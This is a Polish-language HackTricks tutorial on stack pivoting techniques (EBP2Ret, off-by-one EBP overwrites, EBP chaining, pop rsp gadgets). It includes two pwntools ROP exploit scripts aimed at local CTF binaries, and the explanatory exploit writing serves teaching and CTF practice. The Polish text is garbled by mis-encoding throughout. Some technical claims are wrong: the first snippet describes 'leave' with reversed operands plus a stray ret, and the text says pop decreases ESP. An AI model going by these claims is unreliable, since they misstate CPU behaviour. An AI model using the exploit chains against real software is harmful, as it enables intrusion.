# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Ta technika wykorzystuje moÅ¼liwoÅ›Ä‡ manipulowania **WskaÅºnikiem Bazowym (EBP)** do Å‚aÅ„cuchowego wykonywania wielu funkcji poprzez ostroÅ¼ne wykorzystanie rejestru EBP i sekwencji instrukcji **`leave; ret`**.

Jako przypomnienie, **`leave`** oznacza w zasadzie:
```
mov       ebp, esp
pop       ebp
ret
```
I poniewaÅ¼ **EBP znajduje siÄ™ na stosie** przed EIP, moÅ¼liwe jest jego kontrolowanie poprzez kontrolowanie stosu.

### EBP2Ret

Ta technika jest szczegÃ³lnie przydatna, gdy moÅ¼na **zmieniÄ‡ rejestr EBP, ale nie ma bezpoÅ›redniego sposobu na zmianÄ™ rejestru EIP**. Wykorzystuje zachowanie funkcji po zakoÅ„czeniu ich wykonania.

JeÅ›li podczas wykonywania `fvuln` uda ci siÄ™ wstrzyknÄ…Ä‡ **faÅ‚szywy EBP** na stosie wskazujÄ…cy na obszar w pamiÄ™ci, gdzie znajduje siÄ™ adres twojego shellcode (plus 4 bajty na operacjÄ™ `pop`), moÅ¼esz poÅ›rednio kontrolowaÄ‡ EIP. Gdy `fvuln` zwraca, ESP jest ustawiane na ten spreparowany adres, a nastÄ™pna operacja `pop` zmniejsza ESP o 4 bajty, **efektywnie wskazujÄ…c na adres przechowywany przez atakujÄ…cego.**\
ZauwaÅ¼, Å¼e musisz znaÄ‡ **2 adresy**: Ten, gdzie ma trafiÄ‡ ESP, gdzie bÄ™dziesz musiaÅ‚ zapisaÄ‡ adres wskazywany przez ESP.

#### Konstrukcja ataku

Najpierw musisz znaÄ‡ **adres, gdzie moÅ¼esz pisaÄ‡ dowolne dane / adresy**. ESP bÄ™dzie wskazywaÅ‚ tutaj i **wykona pierwsze `ret`**.

NastÄ™pnie musisz znaÄ‡ adres uÅ¼ywany przez `ret`, ktÃ³ry **wykona kod dowolny**. MoÅ¼esz uÅ¼yÄ‡:

* PrawidÅ‚owy adres [**ONE\_GADGET**](https://github.com/david942j/one\_gadget).
* Adres **`system()`** poprzedzony **4 niepotrzebnymi bajtami** i adresem `"/bin/sh"` (bity x86).
* Adres gadÅ¼etu **`jump esp;`** ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) poprzedzony **shellcodem** do wykonania.
* PewnÄ… Å‚aÅ„cuch [**ROP**](../rop-return-oriented-programing/).

PamiÄ™taj, Å¼e przed kaÅ¼dym z tych adresÃ³w w kontrolowanej czÄ™Å›ci pamiÄ™ci muszÄ… byÄ‡ **`4` bajty** ze wzglÄ™du na czÄ™Å›Ä‡ **`pop`** instrukcji `leave`. MoÅ¼na wykorzystaÄ‡ te 4B, aby ustawiÄ‡ **drugiego faÅ‚szywego EBP** i kontynuowaÄ‡ kontrolowanie wykonania.

#### Atak Off-By-One

Istnieje specyficzna wersja tej techniki znana jako "Atak Off-By-One". Jest uÅ¼ywana, gdy moÅ¼na **zmodyfikowaÄ‡ tylko najmniej znaczÄ…cy bajt EBP**. W takim przypadku lokalizacja pamiÄ™ci przechowujÄ…ca adres do skoku z **`ret`** musi dzieliÄ‡ trzy pierwsze bajty z EBP, co pozwala na podobnÄ… manipulacjÄ™ przy bardziej ograniczonych warunkach.\
Zazwyczaj modyfikowany jest bajt 0x00, aby skoczyÄ‡ jak najdalej.

Jest rÃ³wnieÅ¼ powszechne uÅ¼ycie Å›lizgu RET na stosie i umieszczenie prawdziwej Å‚aÅ„cucha ROP na koÅ„cu, aby zwiÄ™kszyÄ‡ prawdopodobieÅ„stwo, Å¼e nowy ESP wskaÅ¼e do Å›lizgu RET i zostanie wykonany ostateczny Å‚aÅ„cuch ROP.

### **ÅaÅ„cuchowanie EBP**

Dlatego umieszczenie kontrolowanego adresu w wpisie `EBP` na stosie i adresu `leave; ret` w `EIP` pozwala na **przeniesienie `ESP` do kontrolowanego adresu `EBP` ze stosu**.

Teraz **`ESP`** jest kontrolowany wskazujÄ…c na poÅ¼Ä…dany adres, a nastÄ™pnÄ… instrukcjÄ… do wykonania jest `RET`. Aby wykorzystaÄ‡ to, moÅ¼na umieÅ›ciÄ‡ w kontrolowanym miejscu ESP to:

* **`&(nastÄ™pny faÅ‚szywy EBP)`** -> Wczytaj nowy EBP z powodu `pop ebp` z instrukcji `leave`
* **`system()`** -> WywoÅ‚ane przez `ret`
* **`&(leave;ret)`** -> WywoÅ‚ane po zakoÅ„czeniu systemu, przeniesie ESP do faÅ‚szywego EBP i rozpocznie ponownie
* **`&("/bin/sh")`**-> Parametr dla `system`

W ten sposÃ³b moÅ¼na Å‚aÅ„cuchowaÄ‡ kilka faÅ‚szywych EBPs, aby kontrolowaÄ‡ przepÅ‚yw programu.

To jest podobne do [ret2lib](../rop-return-oriented-programing/ret2lib/), ale bardziej zÅ‚oÅ¼one bez oczywistej korzyÅ›ci, ale moÅ¼e byÄ‡ interesujÄ…ce w niektÃ³rych skrajnych przypadkach.

Ponadto, tutaj masz [**przykÅ‚ad wyzwania**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave), ktÃ³re wykorzystuje tÄ™ technikÄ™ z **wyciekiem stosu** do wywoÅ‚ania funkcji wygrywajÄ…cej. To jest ostateczny Å‚adunek ze strony:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP moÅ¼e nie byÄ‡ uÅ¼ywany

Jak [**wyjaÅ›niono w tym poÅ›cie**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), jeÅ›li binarny jest skompilowany z pewnymi optymalizacjami, **EBP nigdy nie kontroluje ESP**, dlatego teÅ¼ jakiekolwiek wykorzystanie dziaÅ‚ajÄ…ce poprzez kontrolÄ™ EBP zasadniczo zawiedzie, poniewaÅ¼ nie ma to Å¼adnego rzeczywistego efektu.\
Dzieje siÄ™ tak, poniewaÅ¼ **prolog i epilog ulegajÄ… zmianie**, jeÅ›li binarny jest zoptymalizowany.

* **Niezoptymalizowany:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Zoptymalizowany:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Inne sposoby kontrolowania RSP

### **GadÅ¼et `pop rsp`**

[**Na tej stronie**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) znajdziesz przykÅ‚ad uÅ¼ycia tej techniki. W tym wyzwaniu konieczne byÅ‚o wywoÅ‚anie funkcji z 2 konkretnymi argumentami, a dostÄ™pny byÅ‚ **gadÅ¼et `pop rsp`** oraz **wyciek ze stosu**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadzet
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

SprawdÅº technikÄ™ ret2esp tutaj:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Referencje i Inne PrzykÅ‚ady

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bity, eksploatacja off by one z Å‚aÅ„cuchem rop zaczynajÄ…cym siÄ™ od ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bity, brak relro, canary, nx i pie. Program udostÄ™pnia wyciek dla stosu lub pie oraz WWW qword. Najpierw uzyskaj wyciek stosu i uÅ¼yj WWW, aby wrÃ³ciÄ‡ i uzyskaÄ‡ wyciek pie. NastÄ™pnie uÅ¼yj WWW, aby stworzyÄ‡ wiecznÄ… pÄ™tlÄ™ naduÅ¼ywajÄ…c wpisÃ³w `.fini_array` + wywoÅ‚ujÄ…c `__libc_csu_fini` ([wiÄ™cej informacji tutaj](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). NaduÅ¼ywajÄ…c tego "wiecznego" zapisu, zostaje napisany Å‚aÅ„cuch ROP w .bss i koÅ„czy siÄ™ jego wywoÅ‚aniem, obracajÄ…c siÄ™ z RBP.

## ARM64

W ARM64, **prologi i epilogi** funkcji **nie przechowujÄ… i nie przywracajÄ… rejestru SP** na stosie. Dlatego domyÅ›lnie **nie bÄ™dziesz mÃ³gÅ‚ kontrolowaÄ‡ rejestru SP** poprzez nadpisanie pewnych danych wewnÄ…trz stosu.



<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
